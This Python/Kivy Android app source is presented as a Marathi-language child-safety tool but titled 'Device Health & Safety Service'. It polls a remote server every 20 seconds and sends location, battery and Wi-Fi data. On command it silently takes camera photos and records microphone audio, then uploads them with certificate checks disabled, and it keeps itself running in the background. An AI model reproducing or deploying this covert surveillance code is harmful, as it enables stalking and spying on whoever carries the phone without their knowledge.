import os
import sys
import json
import datetime
import requests
import uuid
import threading
import urllib3

# Android SSL certificate warnings suppress
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from kivy.app import App
from kivy.clock import Clock
from kivy.utils import platform
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput

# ================= Configuration Management =================
DEFAULT_SERVER_URL = "https://device-update.onrender.com"
CONFIG_FILE = "child_config.json"

def get_android_device_name():
    """मोबाईलमधून फोनचे नाव किंवा मॉडेल आपोआप (Automatically) शोधणे"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Settings = autoclass('android.provider.Settings')
            Build = autoclass('android.os.Build')
            context = PythonActivity.mActivity.getApplicationContext()
            cr = context.getContentResolver()

            # १. फोन सेटिंग्जमधील नाव (उदा. 'Rahul Phone' किंवा 'Aryan S21')
            dev_name = None
            try:
                dev_name = Settings.Global.getString(cr, "device_name")
            except Exception:
                pass

            # २. ब्लूटूथ डिव्हाइस नाव
            if not dev_name:
                try:
                    dev_name = Settings.Secure.getString(cr, "bluetooth_name")
                except Exception:
                    pass

            # ३. फोनचा ब्रँड आणि मॉडेल (उदा. 'Samsung Galaxy M31', 'Redmi Note 11')
            if not dev_name:
                mfg = str(Build.MANUFACTURER).capitalize()
                model = str(Build.MODEL)
                if model.lower().startswith(mfg.lower()):
                    dev_name = model
                else:
                    dev_name = f"{mfg} {model}"

            if dev_name and dev_name.strip():
                return dev_name.strip()
        except Exception as e:
            print("[AUTO DEVICE NAME ERROR]", e)
    return "Child_Mobile_Phone"

def get_android_location():
    """Fetch location directly via Android LocationManager (GPS + Wi-Fi/Cell Network indoors)"""
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            LocationManager = autoclass('android.location.LocationManager')

            activity = PythonActivity.mActivity
            lm = activity.getApplicationContext().getSystemService(Context.LOCATION_SERVICE)

            # 1. Try GPS satellite
            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            # 2. Try Network provider (Cell tower / Wi-Fi - works indoors)
            if not loc:
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            # 3. Try Passive provider
            if not loc:
                loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if loc:
                lat = float(loc.getLatitude())
                lon = float(loc.getLongitude())
                acc = float(loc.getAccuracy())
                return lat, lon, acc
        except Exception as e:
            print("[LOCATION MANAGER ERROR]", e)
    return None

def load_config():
    auto_name = get_android_device_name()
    persistent_id = str(uuid.uuid4())[:12]
    default_cfg = {
        "server_url": DEFAULT_SERVER_URL,
        "child_name": auto_name,
        "device_id": persistent_id,
        "poll_interval": 20,
        "is_configured": True
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                saved = json.load(f)
                if not saved.get("server_url") or "127.0.0.1" in str(saved.get("server_url")):
                    saved["server_url"] = DEFAULT_SERVER_URL
                if not saved.get("child_name") or saved.get("child_name") in ["Child_Mobile", "Child_Mobile_Device", "Child_Mobile_Phone"]:
                    saved["child_name"] = auto_name
                if not saved.get("device_id"):
                    saved["device_id"] = persistent_id
                return saved
        except Exception:
            pass
    return default_cfg

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=4)
    except Exception as e:
        print("[CONFIG SAVE ERROR]", e)

# ================= Android Hardware Wrappers =================

def request_ignore_battery_optimizations():
    if platform == 'android':
        try:
            from jnius import autoclass
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity

            package_name = activity.getPackageName()
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse("package:" + package_name))
            activity.startActivity(intent)
            return True
        except Exception as e:
            print("[BATTERY POPUP ERROR]", e)
    return False

def get_android_battery():
    if platform == 'android':
        try:
            from jnius import autoclass
            Intent = autoclass('android.content.Intent')
            IntentFilter = autoclass('android.content.IntentFilter')
            BatteryManager = autoclass('android.os.BatteryManager')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')

            context = PythonActivity.mActivity.getApplicationContext()
            ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            battery_status = context.registerReceiver(None, ifilter)

            level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            status = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)

            battery_pct = int((level / float(scale)) * 100) if scale > 0 else 100
            is_charging = status == BatteryManager.BATTERY_STATUS_CHARGING or status == BatteryManager.BATTERY_STATUS_FULL
            return battery_pct, is_charging
        except Exception as e:
            print("[BATTERY ERROR]", e)
    return 95, False

def get_android_wifi_ssid():
    if platform == 'android':
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            activity = PythonActivity.mActivity
            wifi_manager = activity.getApplicationContext().getSystemService(Context.WIFI_SERVICE)
            info = wifi_manager.getConnectionInfo()
            if info:
                ssid = info.getSSID().replace('"', '')
                if ssid and ssid != "<unknown ssid>":
                    return ssid
        except Exception as e:
            print("[WIFI ERROR]", e)
    return "Mobile_Data"

# ================= Main Application =================

class ChildMonitorApp(App):
    def build(self):
        self.title = "Device Health & Safety Service"
        self.config_data = load_config()
        self.server_url = self.config_data.get("server_url", DEFAULT_SERVER_URL).strip()
        self.child_name = self.config_data.get("child_name", get_android_device_name())
        self.device_id = self.config_data.get("device_id", str(uuid.getnode()))
        self.current_lat = 19.0760
        self.current_lon = 72.8777
        self.connection_status = "सर्व्हरशी संपर्क होत आहे..."

        self.root_layout = BoxLayout(orientation='vertical')

        # मुख्य मॉनिटरिंग स्क्रीन
        self.show_active_monitoring_screen()

        # परवानग्या आणि GPS इनिशियलायझेशन
        self.request_android_permissions()
        self.init_gps()

        # बॅकग्राउंड पोलिंग (दर २० सेकंदांनी)
        Clock.schedule_once(lambda dt: self.start_bg_poll(), 1)
        Clock.schedule_interval(lambda dt: self.start_bg_poll(), 20)

        return self.root_layout

    # -------- Lifecycle: App keeps running in background --------
    def on_pause(self):
        """हे ॲप मिनिमाइझ झाल्यावर किंवा स्क्रीन लॉक झाल्यावर बॅकग्राउंडमध्ये जिवंत ठेवते"""
        return True

    def on_resume(self):
        pass

    # -------- Main Active Screen --------
    def show_active_monitoring_screen(self):
        self.root_layout.clear_widgets()

        active_box = BoxLayout(orientation='vertical', padding=20, spacing=15)

        self.title_label = Label(
            text="🛡️ बाल सुरक्षा व पालक नियंत्रण\n(Child Safety Service Active)",
            font_size='18sp',
            bold=True,
            halign='center',
            size_hint=(1, 0.20)
        )
        active_box.add_widget(self.title_label)

        # ठळक आणीबाणीचे SOS बटण
        self.sos_btn = Button(
            text="🚨 आणीबाणी (EMERGENCY SOS)\n[मदतीसाठी येथे दाबा]",
            font_size='20sp',
            bold=True,
            background_color=(0.9, 0.15, 0.15, 1),
            size_hint=(1, 0.42)
        )
        self.sos_btn.bind(on_press=self.trigger_sos_alert)
        active_box.add_widget(self.sos_btn)

        self.info_label = Label(
            text=f"डिव्हाइस नाव: {self.child_name}\nस्थिती: {self.connection_status}\nसर्व्हर: {self.server_url}",
            font_size='13sp',
            color=(0.85, 0.85, 0.85, 1),
            halign='center',
            size_hint=(1, 0.23)
        )
        active_box.add_widget(self.info_label)

        btn_settings = Button(
            text="⚙️ सेटिंग्ज (सर्व्हर URL / नाव बदला)",
            font_size='14sp',
            background_color=(0.25, 0.35, 0.45, 1),
            size_hint=(1, 0.15)
        )
        btn_settings.bind(on_press=lambda x: self.show_setup_screen())
        active_box.add_widget(btn_settings)

        self.root_layout.add_widget(active_box)

    # -------- Settings Screen --------
    def show_setup_screen(self):
        self.root_layout.clear_widgets()

        setup_box = BoxLayout(orientation='vertical', padding=25, spacing=12)

        title = Label(
            text="⚙️ पालक सेटिंग्ज (Configuration)",
            font_size='19sp',
            bold=True,
            size_hint=(1, 0.12)
        )
        setup_box.add_widget(title)

        lbl_url = Label(text="सर्व्हर URL (Server Address):", font_size='13sp', size_hint=(1, 0.08))
        setup_box.add_widget(lbl_url)

        self.input_url = TextInput(
            text=self.server_url,
            multiline=False,
            font_size='15sp',
            size_hint=(1, 0.12)
        )
        setup_box.add_widget(self.input_url)

        lbl_name = Label(text="मुलाचे / डिव्हाइसचे नाव (Child Name):", font_size='13sp', size_hint=(1, 0.08))
        setup_box.add_widget(lbl_name)

        self.input_name = TextInput(
            text=self.child_name,
            multiline=False,
            font_size='15sp',
            size_hint=(1, 0.12)
        )
        setup_box.add_widget(self.input_name)

        btn_battery = Button(
            text="🔋 १-क्लिक: बॅटरी निर्बंध बंद करा (Keep Alive)",
            font_size='13sp',
            background_color=(0.2, 0.6, 0.9, 1),
            size_hint=(1, 0.14)
        )
        btn_battery.bind(on_press=lambda x: request_ignore_battery_optimizations())
        setup_box.add_widget(btn_battery)

        btn_save = Button(
            text="💾 सेव्ह करा व सुरू करा (Save & Start)",
            font_size='16sp',
            bold=True,
            background_color=(0.1, 0.75, 0.3, 1),
            size_hint=(1, 0.16)
        )
        btn_save.bind(on_press=self.save_and_start)
        setup_box.add_widget(btn_save)

        self.root_layout.add_widget(setup_box)

    def save_and_start(self, instance):
        raw_url = self.input_url.text.strip()
        name = self.input_name.text.strip()

        if raw_url:
            if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
                raw_url = "http://" + raw_url
            raw_url = raw_url.rstrip("/")
            self.server_url = raw_url
            self.config_data["server_url"] = raw_url

        if name:
            self.child_name = name
            self.config_data["child_name"] = name

        save_config(self.config_data)
        self.show_active_monitoring_screen()
        Clock.schedule_once(lambda dt: self.start_bg_poll(), 1)

    # -------- Permissions & GPS --------
    def request_android_permissions(self):
        if platform == 'android':
            try:
                from android.permissions import Permission, request_permissions
                permissions = [
                    Permission.ACCESS_FINE_LOCATION,
                    Permission.ACCESS_COARSE_LOCATION,
                    Permission.CAMERA,
                    Permission.RECORD_AUDIO,
                    Permission.READ_PHONE_STATE
                ]
                request_permissions(permissions)
            except Exception as e:
                print("[PERMISSIONS ERROR]", e)

    def init_gps(self):
        if platform == 'android':
            try:
                from plyer import gps
                gps.configure(on_location=self.on_location_received)
                gps.start(minTime=10000, minDistance=5)
            except Exception as e:
                print("[GPS INIT ERROR]", e)

    def on_location_received(self, **kwargs):
        self.current_lat = kwargs.get('lat', self.current_lat)
        self.current_lon = kwargs.get('lon', self.current_lon)

    # -------- Background Polling (Asynchronous Worker Thread) --------
    def start_bg_poll(self):
        """UI फ्रीझ होऊ नये म्हणून स्वतंत्र बॅकग्राउंड थ्रेडमध्ये नेटवर्क कॉल्स चालवणे"""
        t = threading.Thread(target=self._worker_cycle, daemon=True)
        t.start()

    def _worker_cycle(self):
        if not self.server_url:
            return

        url = f"{self.server_url}/get_commands/{self.device_id}"
        battery, is_charging = get_android_battery()
        wifi_ssid = get_android_wifi_ssid()

        payload = {
            "child_name": self.child_name,
            "battery_level": battery,
            "is_charging": is_charging,
            "wifi_ssid": wifi_ssid
        }

        try:
            response = requests.post(url, json=payload, timeout=12, verify=False)
            if response.status_code == 200:
                self.connection_status = "🟢 सर्व्हरशी जोडलेले (Live OK)"
                commands = response.json()

                # १. थेट GPS लोकेशन पाठवणे
                if commands.get("location_access", True):
                    self.send_location_bg()

                # २. कॅमेरा फोटो आदेश
                camera_mode = commands.get("camera_access")
                if camera_mode in ["FRONT", "BACK"]:
                    Clock.schedule_once(lambda dt: self.capture_camera(camera_mode), 0)

                # ३. ऑडिओ रेकॉर्ड आदेश
                if commands.get("audio_access") is True:
                    Clock.schedule_once(lambda dt: self.record_audio(), 0)

                # ४. रिमोट गजर / फोन वाजवणे (Alarm Ring)
                if commands.get("ring_alarm") is True:
                    self.play_remote_alarm(True)
                else:
                    self.play_remote_alarm(False)

                # ५. रिमोट टॉर्च (Flashlight)
                self.set_torch(commands.get("torch_access", False))

            else:
                self.connection_status = f"सर्व्हर प्रतिसाद त्रुटी: {response.status_code}"

        except Exception as e:
            self.connection_status = "सर्व्हरशी संपर्क तुटला (पुन्हा प्रयत्न सुरू...)"

        # UI टेक्स्ट अपडेट करणे (Main Thread वर सुरक्षितपणे)
        Clock.schedule_once(lambda dt: self._update_ui_status(battery, wifi_ssid), 0)

    def _update_ui_status(self, battery, wifi_ssid):
        if hasattr(self, 'info_label'):
            self.info_label.text = (
                f"डिव्हाइस नाव: {self.child_name}\n"
                f"स्थिती: {self.connection_status}\n"
                f"🔋 बॅटरी: {battery}% | 📶 वाय-फाय: {wifi_ssid}\n"
                f"सर्व्हर: {self.server_url}"
            )

    def send_location_bg(self):
        """GPS लोकेशन सर्व्हरला पाठवणे"""
        loc_info = get_android_location()
        if loc_info:
            self.current_lat, self.current_lon, accuracy = loc_info
        else:
            accuracy = 10.0

        try:
            url = f"{self.server_url}/update_location"
            payload = {
                "child_id": self.device_id,
                "latitude": self.current_lat,
                "longitude": self.current_lon,
                "accuracy": accuracy,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            requests.post(url, json=payload, timeout=10, verify=False)
        except Exception as e:
            print("[LOCATION SEND ERROR]", e)

    def trigger_sos_alert(self, instance):
        self.title_label.text = "🚨 आणीबाणी इशारा पाठवला आहे!\nपालकांना सूचना मिळाली आहे."
        t = threading.Thread(target=self._send_sos_worker, daemon=True)
        t.start()

    def _send_sos_worker(self):
        loc_info = get_android_location()
        if loc_info:
            self.current_lat, self.current_lon, _ = loc_info

        try:
            url = f"{self.server_url}/trigger_sos"
            payload = {
                "child_id": self.device_id,
                "latitude": self.current_lat,
                "longitude": self.current_lon
            }
            requests.post(url, json=payload, timeout=10, verify=False)
            self.send_location_bg()
        except Exception as e:
            print("[SOS ERROR]", e)

    # -------- Hardware Controls (Camera, Audio, Alarm, Torch) --------

    def capture_camera(self, mode):
        """कॅमेऱ्याने शांतपणे फोटो काढून सर्व्हरवर अपलोड करणे"""
        if platform != 'android':
            return

        try:
            from jnius import autoclass, java_method, PythonJavaClass
            Camera = autoclass('android.hardware.Camera')
            SurfaceTexture = autoclass('android.graphics.SurfaceTexture')

            cam_id = 1 if mode == 'FRONT' else 0

            class PictureCallback(PythonJavaClass):
                __javainterfaces__ = ['android/hardware/Camera$PictureCallback']

                def __init__(self, upload_func):
                    super().__init__()
                    self.upload_func = upload_func

                @java_method('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, camera):
                    try:
                        if data:
                            self.upload_func(bytes(data))
                    finally:
                        try:
                            camera.stopPreview()
                            camera.release()
                        except Exception:
                            pass

            def do_upload(image_bytes):
                # UI थ्रेड ब्लॉक न करता स्वतंत्र थ्रेडवर अपलोड करणे
                def upload_task():
                    try:
                        url = f"{self.server_url}/upload_camera_photo"
                        files = {"image": ("camera_snap.jpg", image_bytes, "image/jpeg")}
                        data = {"child_id": self.device_id}
                        requests.post(url, data=data, files=files, timeout=15, verify=False)
                        print("[CAMERA] Photo uploaded successfully!")
                    except Exception as err:
                        print("[CAMERA UPLOAD ERROR]", err)
                threading.Thread(target=upload_task, daemon=True).start()

            cam = Camera.open(cam_id)
            dummy_texture = SurfaceTexture(10)
            cam.setPreviewTexture(dummy_texture)
            cam.startPreview()

            cb = PictureCallback(do_upload)
            cam.takePicture(None, None, cb)
        except Exception as e:
            print("[CAMERA CAPTURE ERROR]", e)

    def record_audio(self):
        """आधुनिक ब्राउझरमध्ये थेट प्ले होणारा AAC/M4A ऑडिओ सुरक्षित डिरेक्टरीमध्ये रेकॉर्ड करणे"""
        if platform == 'android':
            try:
                from jnius import autoclass
                MediaRecorder = autoclass('android.media.MediaRecorder')
                AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
                OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
                AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

                recorder = MediaRecorder()
                recorder.setAudioSource(AudioSource.MIC)
                # Android 11+ Scoped Storage क्रॅश रोखण्यासाठी MPEG_4 आणि AAC वापरणे
                recorder.setOutputFormat(OutputFormat.MPEG_4)
                recorder.setAudioEncoder(AudioEncoder.AAC)

                # अंतर्गत सुरक्षित पाथ
                output_path = os.path.join(self.user_data_dir, "emergency_voice.m4a")
                recorder.setOutputFile(output_path)
                recorder.prepare()
                recorder.start()

                # ५ सेकंदांचे ऑडिओ रेकॉर्डिंग
                Clock.schedule_once(lambda dt: self._finish_audio_record(recorder, output_path), 5)
            except Exception as e:
                print("[AUDIO RECORDER ERROR]", e)

    def _finish_audio_record(self, recorder, output_path):
        def upload_audio_worker():
            try:
                recorder.stop()
                recorder.release()

                if os.path.exists(output_path):
                    with open(output_path, "rb") as f:
                        files = {"audio": ("emergency_voice.m4a", f, "audio/mp4")}
                        data = {"child_id": self.device_id}
                        requests.post(f"{self.server_url}/upload_audio", data=data, files=files, timeout=15, verify=False)
                    print("[AUDIO] Audio clip uploaded successfully!")
            except Exception as e:
                print("[AUDIO UPLOAD ERROR]", e)
        threading.Thread(target=upload_audio_worker, daemon=True).start()

    def play_remote_alarm(self, should_play):
        """पालकांनी 'फोन वाजवा' बटण दाबल्यास मोठ्याने गजर वाजवणे"""
        if platform == 'android':
            try:
                from jnius import autoclass
                RingtoneManager = autoclass('android.media.RingtoneManager')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                context = PythonActivity.mActivity.getApplicationContext()

                if should_play and not hasattr(self, '_ringtone_obj'):
                    uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                    if not uri:
                        uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                    self._ringtone_obj = RingtoneManager.getRingtone(context, uri)
                    if self._ringtone_obj:
                        self._ringtone_obj.play()
                elif not should_play and hasattr(self, '_ringtone_obj'):
                    if self._ringtone_obj and self._ringtone_obj.isPlaying():
                        self._ringtone_obj.stop()
                    del self._ringtone_obj
            except Exception as e:
                print("[ALARM ERROR]", e)

    def set_torch(self, enable):
        """रिमोट टॉर्च ऑन/ऑफ करणे"""
        if platform == 'android':
            try:
                from jnius import autoclass
                CameraManager = autoclass('android.hardware.camera2.CameraManager')
                Context = autoclass('android.content.Context')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                cm = activity.getSystemService(Context.CAMERA_SERVICE)
                cam_ids = cm.getCameraIdList()
                if cam_ids and len(cam_ids) > 0:
                    cm.setTorchMode(cam_ids[0], bool(enable))
            except Exception as e:
                pass

if __name__ == '__main__':
    ChildMonitorApp().run()
